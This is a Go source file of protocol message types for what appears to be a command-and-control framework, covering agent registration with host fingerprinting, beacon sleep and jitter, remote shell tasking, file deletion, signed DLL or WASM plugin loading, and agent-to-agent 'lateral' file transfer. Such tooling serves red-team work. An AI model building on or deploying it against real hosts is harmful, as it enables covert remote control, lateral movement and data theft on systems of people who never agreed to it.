package protocol

import "encoding/json"

// Type1 message payloads. Register travels as plaintext JSON (its only secret,
// the session key, is RSA-wrapped); every later message's Data field is a
// sealed []byte carried as a base64 string.

// SystemInfo is the agent fingerprint collected at registration.
type SystemInfo struct {
	Hostname   string `json:"hostname"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	User       string `json:"user"`
	PID        int    `json:"pid"`
	Process    string `json:"process"`
	AgentVer   string `json:"agent_ver"`
	InternalIP string `json:"internal_ip,omitempty"`
}

// RegisterInfo is the plaintext Data of MsgRegister.
type RegisterInfo struct {
	Agent      string     `json:"agent"` // hex agent id (8 random bytes)
	System     SystemInfo `json:"system"`
	WrappedKey []byte     `json:"wk"`              // RSA-OAEP session key blob
	PSKProof   []byte     `json:"psk"`             // PSKProof(psk, agent, keyID)
	Caps       []string   `json:"caps,omitempty"`  // agent capabilities (rcp/view/file/plugin-wasm/...)
	TS         int64      `json:"ts,omitempty"`    // unix seconds; replay window (P6)
	Nonce      string     `json:"nonce,omitempty"` // unique per registration (P6)
	Proto      int        `json:"proto,omitempty"` // agent protocol version (P6 negotiation)
}

// RegisterAck is the plaintext Data of MsgRegisterAck.
type RegisterAck struct {
	OK          bool     `json:"ok"`
	Reason      string   `json:"reason,omitempty"`
	ServerNow   int64    `json:"server_now"` // unix seconds, for drift detection
	SleepMS     int      `json:"sleep_ms"`   // initial interval from listener profile
	JitterPct   int      `json:"jitter_pct"`
	GraceCycles int      `json:"grace_cycles"`        // missed checkins before idle/offline
	RCPAddr     string   `json:"rcp_addr,omitempty"`  // Type2 dial target (plan §2.3)
	RPCToken    string   `json:"rcp_token,omitempty"` // stateless RCP credential
	Proto       int      `json:"proto,omitempty"`     // server protocol version (P6)
	Caps        []string `json:"caps,omitempty"`      // server capabilities (P6)
}

// Heartbeat is the sealed Data of MsgCheckin.
type Heartbeat struct {
	Seq      uint64 `json:"seq"`
	UptimeMS int64  `json:"uptime_ms"`
}

// Task is the sealed Data inside a MsgCheckin response (or null when idle).
type Task struct {
	ID      string          `json:"id"`
	Cmd     uint32          `json:"cmd"`
	Args    json.RawMessage `json:"args,omitempty"`
	Created int64           `json:"created"`
}

// TaskResult is the sealed Data of MsgResult.
type TaskResult struct {
	TaskID string `json:"task_id"`
	OK     bool   `json:"ok"`
	Exit   int    `json:"exit"`
	Output string `json:"output"`
}

// PluginLoadArgs is Task.Args for CmdPluginLoad (plan §5.3): the module is
// delivered base64'd with its manifest and detached Ed25519 signature over
// manifest-bytes || module-bytes. The agent refuses to load on any verify
// failure. Native DLLs may instead travel through StageURL (one-time Type4
// fetch, ?b64=1) when they are too large for a task payload.
type PluginLoadArgs struct {
	ID        string `json:"id"`
	Version   string `json:"version"`
	Kind      string `json:"kind,omitempty"`      // wat | wasm | native-dll
	Manifest  string `json:"manifest"`            // manifest JSON (verbatim signed bytes)
	ModuleB64 string `json:"module,omitempty"`    // base64 wat/wasm/native-dll
	StageURL  string `json:"stage_url,omitempty"` // large modules: one-time fetch URL (?b64=1)
	Sha256    string `json:"sha256,omitempty"`    // module integrity (hex) when staged
	Sig       string `json:"sig"`                 // base64 ed25519 signature
}

// ManifestLite is the subset of a plugin manifest the agent host reads.
type ManifestLite struct {
	ID           string   `json:"id"`
	Version      string   `json:"version"`
	Capabilities []string `json:"capabilities"`
	ABI          int      `json:"abi,omitempty"` // 0 = exec(a,b)->i32; 1 = exec_json + host env (docs/PLUGIN_SDK.md)
}

// PluginExecArgs is Task.Args for CmdPluginExec. ABI v0: exported
// `exec(a i32, b i32) i32`.
type PluginExecArgs struct {
	ID    string          `json:"id"`
	Entry string          `json:"entry"`
	A     int32           `json:"a"`
	B     int32           `json:"b"`
	Args  json.RawMessage `json:"args,omitempty"` // ABI v1: JSON in for exec_json
}

// PubkeyInfo is the Data of a pubkey response (pre-registration bootstrap).
type PubkeyInfo struct {
	PEM string `json:"pem"`
}

// ShellArgs is Task.Args for CmdShell.
type ShellArgs struct {
	Command   string `json:"command"`
	TimeoutMS int    `json:"timeout_ms,omitempty"`
}

// LsArgs is Task.Args for CmdLsJSON.
type LsArgs struct {
	Path string `json:"path"`
}

// LsEntry is one row of a structured directory listing (CmdLsJSON result).
type LsEntry struct {
	Name  string `json:"name"`
	Dir   bool   `json:"dir"`
	Size  int64  `json:"size"`
	MTime int64  `json:"mtime"`
}

// MkdirArgs / RmArgs: single-path FS mutations (M2 basics).
type MkdirArgs struct {
	Path string `json:"path"`
}
type RmArgs struct {
	Path string `json:"path"`
}

// SleepArgs is Task.Args for CmdSleep (dynamic re-timing, plan §2.2).
type SleepArgs struct {
	SleepMS   int `json:"sleep_ms"`
	JitterPct int `json:"jitter_pct"`
}

// ---- P2P bridge (Type2.5, docs/P2P_DESIGN.md) ----

// P2PBridgeArgs rides a Type1 task: SDP offer (base64 JSON) + auth nonce.
type P2PBridgeArgs struct {
	Offer string `json:"offer"` // browser SDP, base64
	Nonce string `json:"nonce"` // server-issued; proof = HMAC(psk, nonce)
}

// P2PBridgeResult returns the agent's SDP answer over the task result.
type P2PBridgeResult struct {
	Answer string `json:"answer"` // agent SDP, base64
}

// ---- agent<->agent lateral transfer (mothership, docs/LATERAL.md) ----

// XferServeArgs: bind a ONE-SHOT listener (single connection, then closed),
// authenticate peer via proof, stream path out in length-prefixed chunks.
type XferServeArgs struct {
	Addr  string `json:"addr"`  // bind address, ":0" = ephemeral
	Path  string `json:"path"`  // file to serve
	Nonce string `json:"nonce"` // proof = HMAC(psk, "xfer|"+nonce)
}

type XferServeResult struct {
	Addr  string `json:"addr"` // actual bound address for the fetcher
	Bytes int64  `json:"bytes"`
}

// XferFetchArgs: dial addr, prove, receive, write to Local.
type XferFetchArgs struct {
	Addr  string `json:"addr"`
	Nonce string `json:"nonce"`
	Local string `json:"local"`
}

type XferFetchResult struct {
	Bytes  int64  `json:"bytes"`
	SHA256 string `json:"sha256"`
}
